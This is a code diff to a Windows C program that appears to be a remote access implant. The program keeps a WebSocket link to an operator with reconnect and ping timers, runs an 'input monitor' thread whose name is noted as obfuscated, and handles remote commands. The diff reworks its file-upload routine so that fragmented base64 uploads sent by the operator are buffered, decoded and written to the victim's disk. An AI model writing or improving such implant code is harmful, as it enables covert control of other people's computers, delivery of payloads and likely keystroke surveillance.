@@ -51,7 +51,8 @@ typedef struct _BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO {
 #pragma comment(lib, "crypt32.lib")
 #pragma comment(lib, "bcrypt.lib")
 
-#define BUFFER_SIZE 65536
+#define BUFFER_SIZE 262144  // 256KB for large uploads
+#define UPLOAD_BUFFER_SIZE 524288  // 512KB for upload accumulation
 #define RECONNECT_DELAY 3000
 #define PING_INTERVAL 10000
 
@@ -264,6 +265,12 @@ static int g_upload_in_progress = 0;
 static char g_upload_filename[MAX_PATH];
 static FILE* g_upload_file = NULL;
 static long g_upload_received = 0;
+static long g_upload_expected_size = 0;
+
+// Upload accumulation buffer for fragmented WebSocket messages
+static char* g_upload_buffer = NULL;
+static int g_upload_buffer_len = 0;
+static int g_upload_buffer_capacity = 0;
 
 // Input monitor state (obfuscated name)
 static HANDLE g_input_mon_thread = NULL;
@@ -3276,14 +3283,50 @@ void change_directory(const char* path) {
 int handle_upload_data(char* data, int len) {
     // Check for upload start marker
     char* upload_start = strstr(data, "<<<UPLOAD_START>>>");
+    
     if (upload_start && !g_upload_in_progress) {
-        char* name_end = strstr(data, "<<<NAME_END>>>");
-        char* upload_end = strstr(data, "<<<UPLOAD_END>>>");
+        // Start of a new upload - initialize accumulation buffer
+        g_upload_in_progress = 1;
+        g_upload_buffer_len = 0;
         
-        if (name_end && upload_end) {
-            // Extract filename and size (format: filename|size)
-            char* filename_start = upload_start + 18;  // len of <<<UPLOAD_START>>>
+        // Allocate or reallocate buffer (512KB should be enough for most files)
+        if (g_upload_buffer_capacity < UPLOAD_BUFFER_SIZE) {
+            if (g_upload_buffer) free(g_upload_buffer);
+            g_upload_buffer = (char*)malloc(UPLOAD_BUFFER_SIZE);
+            if (!g_upload_buffer) {
+                send_websocket_data("[!] Upload buffer allocation failed\n", 37);
+                g_upload_in_progress = 0;
+                return -1;
+            }
+            g_upload_buffer_capacity = UPLOAD_BUFFER_SIZE;
+        }
+        
+        // Copy data to accumulation buffer
+        if (len > 0 && len < g_upload_buffer_capacity) {
+            memcpy(g_upload_buffer, data, len);
+            g_upload_buffer_len = len;
+        }
+    } else if (g_upload_in_progress) {
+        // Accumulate more data
+        if (g_upload_buffer && g_upload_buffer_len + len < g_upload_buffer_capacity) {
+            memcpy(g_upload_buffer + g_upload_buffer_len, data, len);
+            g_upload_buffer_len += len;
+        }
+    }
+    
+    // Check if we have complete upload (contains both markers)
+    if (g_upload_in_progress && g_upload_buffer) {
+        g_upload_buffer[g_upload_buffer_len] = '\0';  // Null terminate for strstr
+        
+        char* start_marker = strstr(g_upload_buffer, "<<<UPLOAD_START>>>");
+        char* name_end = strstr(g_upload_buffer, "<<<NAME_END>>>");
+        char* end_marker = strstr(g_upload_buffer, "<<<UPLOAD_END>>>");
+        
+        if (start_marker && name_end && end_marker) {
+            // We have complete upload data - process it
+            char* filename_start = start_marker + 18;  // len of <<<UPLOAD_START>>>
             char* pipe = strchr(filename_start, '|');
+            
             if (pipe && pipe < name_end) {
                 int filename_len = pipe - filename_start;
                 if (filename_len > 0 && filename_len < MAX_PATH) {
@@ -3295,7 +3338,7 @@ int handle_upload_data(char* data, int len) {
                     
                     // Extract base64 data
                     char* b64_start = name_end + 14;  // len of <<<NAME_END>>>
-                    int b64_len = upload_end - b64_start;
+                    int b64_len = end_marker - b64_start;
                     
                     if (b64_len > 0) {
                         // Decode base64
@@ -3323,54 +3366,29 @@ int handle_upload_data(char* data, int len) {
                                     }
                                 }
                                 free(decoded_data);
+                            } else {
+                                send_websocket_data("[!] Memory allocation failed for decode\n", 41);
                             }
+                        } else {
+                            send_websocket_data("[!] Base64 decode failed\n", 26);
                         }
                     }
-                    return 1;
                 }
             }
-        }
-        return 1;
-    }
-    
-    // Legacy chunked upload handling (for backward compatibility)
-    if (g_upload_in_progress) {
-        char* upload_end = strstr(data, "<<<UPLOAD_END>>>");
-        if (upload_end) {
-            // Write data before end marker
-            int data_len = upload_end - data;
-            if (data_len > 0 && g_upload_file) {
-                fwrite(data, 1, data_len, g_upload_file);
-                g_upload_received += data_len;
-            }
             
-            if (g_upload_file) {
-                fflush(g_upload_file);
-                fclose(g_upload_file);
-                g_upload_file = NULL;
-            }
+            // Reset upload state
             g_upload_in_progress = 0;
-            
-            char full_path[MAX_PATH * 2];
-            sprintf(full_path, "%s\\%s", g_current_dir, g_upload_filename);
-            
-            char done_msg[512];
-            sprintf(done_msg, "[+] File saved: %s (%ld bytes)\n", full_path, g_upload_received);
-            send_websocket_data(done_msg, strlen(done_msg));
+            g_upload_buffer_len = 0;
             return 1;
         }
         
-        // Write chunk data
-        if (g_upload_file && len > 0) {
-            fwrite(data, 1, len, g_upload_file);
-            g_upload_received += len;
-            
-            // Flush periodically
-            if (g_upload_received % 8192 == 0) {
-                fflush(g_upload_file);
-            }
-        }
+        // Still waiting for more data
         return 1;
+    }
+    
+    // Check if this looks like upload data (contains start marker but no end)
+    if (strstr(data, "<<<UPLOAD_START>>>") != NULL) {
+        return 1;  // It's upload data, but incomplete
     }
     
     return 0;  // Not upload data
@@ -3652,8 +3670,8 @@ void handle_command(const char* cmd) {
 }
 
 void handle_session() {
-    char buffer[4096];
-    memset(buffer, 0, sizeof(buffer));  // Initialize buffer
+    static char buffer[BUFFER_SIZE];  // Use large static buffer for uploads
+    memset(buffer, 0, sizeof(buffer));
     
     // Start ping thread to keep connection alive
     g_ping_running = 1;
